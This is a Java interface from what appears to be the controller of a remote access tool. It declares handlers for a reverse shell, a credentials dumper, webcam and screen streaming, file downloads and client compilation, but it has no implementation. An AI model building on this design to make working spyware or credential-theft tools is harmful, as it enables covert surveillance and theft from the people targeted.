package Updater;

import Packets.SysNetInfo.NetworkInformation;
import Packets.SysNetInfo.SystemInformation;
import org.json.JSONObject;

public interface UpdaterInterface {
    void addRowOfNewConnection(JSONObject jsonObject);
    void updateDisks(JSONObject jsonObject);
    void updateDirectory(JSONObject jsonObject);
    void updateWebcamDevices(JSONObject jsonObject);
    void updateFrameOfWebcamStreamer(byte[] data);
    void updateReverseShell(JSONObject jsonObject);
    void updateFrameOfScreenStreamer(byte[] finalData);
    void setScreenDimensions(JSONObject jsonObject);
    void updateMonitors(JSONObject jsonObject);
    void updateCredentialsDumper(String path);
    void showPermissionStatus(JSONObject jsonObject);
    void showDownloadedFiles(String outputFolder);
    void updateDownloadState(byte id, int read, boolean isLastPacket);
    void showResultOfCompilation(int result);
    void showResultOfUnZippingClientFiles(boolean result);
    SystemInformation getSystemInformation();
    NetworkInformation getNetworkInformation();

}
